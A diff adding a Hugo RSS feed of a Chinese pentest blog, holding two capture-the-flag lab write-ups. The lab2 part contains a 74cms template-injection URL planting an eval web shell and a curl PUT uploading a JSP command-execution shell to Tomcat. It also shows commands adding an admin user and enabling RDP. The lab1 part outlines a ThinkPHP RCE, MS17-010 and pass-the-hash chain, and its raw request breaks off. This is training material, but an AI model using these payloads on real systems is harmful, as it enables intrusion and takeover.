@@ -1,0 +1,260 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>渗透测试 on 1ux4ry Archive</title><link>https://luxuryzcx.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link><description>Recent content in 渗透测试 on 1ux4ry Archive</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Mon, 06 Jul 2026 23:53:40 +0800</lastBuildDate><atom:link href="https://luxuryzcx.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.xml" rel="self" type="application/rss+xml"/><item><title>cyberstrikelab-lab2</title><link>https://luxuryzcx.github.io/posts/cyberstrikelab-lab2/</link><pubDate>Mon, 06 Jul 2026 23:53:40 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/cyberstrikelab-lab2/</guid><description>&lt;h1 id="flag1"&gt;flag1&lt;/h1&gt;
+&lt;p&gt;初始页面打不开，fscan扫一下10段&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705170323434.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;发现存在10 和 20主机 20主机处于域内&lt;/p&gt;
+&lt;p&gt;10主机发现808端口开放web服务&lt;/p&gt;
+&lt;p&gt;发现是骑士cms&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705163822819.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;找到后台路径&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//192.168.10.10:808/index.php?m=admin&amp;amp;c=index&amp;amp;a=login
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705163911238.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;弱口令 admin admin123456 登录&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705164023816.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;使用nday 模板注入 phpinfo 探测&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//192.168.10.10:808/index.php?m=Admin&amp;amp;c=Tpl&amp;amp;a=set&amp;amp;tpl_dir=%C2%A0%27,%20%27a%27,phpinfo(),%27
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705164131258.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;再来一次就会刷新&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//192.168.10.10:808/index.php?m=Admin&amp;amp;c=Tpl&amp;amp;a=set&amp;amp;tpl_dir= &amp;#39;, &amp;#39;a&amp;#39;,eval($_POST[a]),&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;蚁剑连接 注意shell地址&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//192.168.10.10:808/Application/Home/Conf/config.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;找到第一个flag&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705164704078.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;go-flag{MP9E4xXhya0TlzVF}&lt;/p&gt;
+&lt;h1 id="flag2"&gt;flag2&lt;/h1&gt;
+&lt;p&gt;发现10主机权限巨高&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705165004764.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;先做一下权限维持,可能后面有用（结果发现没用上）&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;添加用户&lt;/span&gt; &lt;span class="n"&gt;zcx&lt;/span&gt; &lt;span class="mi"&gt;1324&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;cbD&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;zcx&lt;/span&gt; &lt;span class="mi"&gt;1324&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;cbD&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;用户添加到管理员组&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="n"&gt;localgroup&lt;/span&gt; &lt;span class="n"&gt;Administrators&lt;/span&gt; &lt;span class="n"&gt;zcx&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;开启注册表&lt;/span&gt;&lt;span class="mi"&gt;3389&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;reg&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="n"&gt;fDenyTSConnections&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;REG_DWORD&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;reg&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="n"&gt;UserAuthentication&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;REG_DWORD&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;reg&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="n"&gt;SecurityLayer&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;REG_DWORD&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;reg&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="n"&gt;MinEncryptionLevel&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;REG_DWORD&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705165708636.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;开始渗透20主机 发现存在经典的 tomcat put 文件上传 CVE&lt;/p&gt;
+&lt;p&gt;直接直接使用 curl完成 了 我比较懒 不想开bp&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="n"&gt;PUT&lt;/span&gt; &lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//192.168.10.20:8080/1.jsp/ -d &amp;#39;&amp;lt;%@ page import=&amp;#34;java.io.*&amp;#34; %&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;getParameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nf"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;InputStream&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;getInputStream&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;is&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;span class="o"&gt;!=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;print&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260705171224624.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;</description></item><item><title>cyberstrikelab-lab1</title><link>https://luxuryzcx.github.io/posts/cyberstrikelab-lab1/</link><pubDate>Sat, 04 Jul 2026 00:30:39 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/cyberstrikelab-lab1/</guid><description>&lt;ol&gt;
+&lt;li&gt;突破互联网边界（192.168.10.10）：thinkphp rce&lt;/li&gt;
+&lt;li&gt;正向shell上线msf（192.168.10.10）&lt;/li&gt;
+&lt;li&gt;信息收集到20网段&lt;/li&gt;
+&lt;li&gt;上线fscan存活20.20和20.30主机存活且存在ms17_010&lt;/li&gt;
+&lt;li&gt;msf添加路由&lt;/li&gt;
+&lt;li&gt;20.20无法使用ms17_010, 20.30只可以使用命令行的ms17_010&lt;/li&gt;
+&lt;li&gt;强开3389，添加用户，添加管理员组，关防火墙&lt;/li&gt;
+&lt;li&gt;远程登录192.168.20.30&lt;/li&gt;
+&lt;li&gt;上传正向shell&lt;/li&gt;
+&lt;li&gt;正向shell上线msf（192.168.20.30）&lt;/li&gt;
+&lt;li&gt;提权&lt;/li&gt;
+&lt;li&gt;hashdump&lt;/li&gt;
+&lt;li&gt;利用域管hash 进行pth攻击，成功拿下192.168.20.20&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id="flag1"&gt;flag1&lt;/h1&gt;
+&lt;p&gt;发现这里是thinkphp框架的 或者用eyou cms的框架漏洞&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520105321688.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;存在rce 写入一句话木马&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;api&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Uploadify&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;preview&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;Host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;192.168.10.10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Cache&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;Control&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;max&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;Language&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;zh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;CN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;zh&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Upgrade&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Insecure&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;Requests&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;Agent&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Mozilla&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;5.0&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;NT&lt;/span&gt; &lt;span class="mf"&gt;10.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;Win64&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;x64&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;AppleWebKit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;537.36&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KHTML&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;like&lt;/span&gt; &lt;span class="n"&gt;Gecko&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;Chrome&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;137.0.0.0&lt;/span&gt; &lt;span class="n"&gt;Safari&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;537.36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;Accept&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;xhtml&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;0.9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;avif&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;webp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;apng&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;*/&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;0.8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="kt"&gt;signed&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;exchange&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;b3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;0.7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;Referer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//192.168.10.10/
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;gzip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;deflate&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;br&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;Cookie&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="n"&gt;n22cd7sqs1oamdd4l10a2mb5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;Connection&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;keep&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;alive&lt;/span&gt;
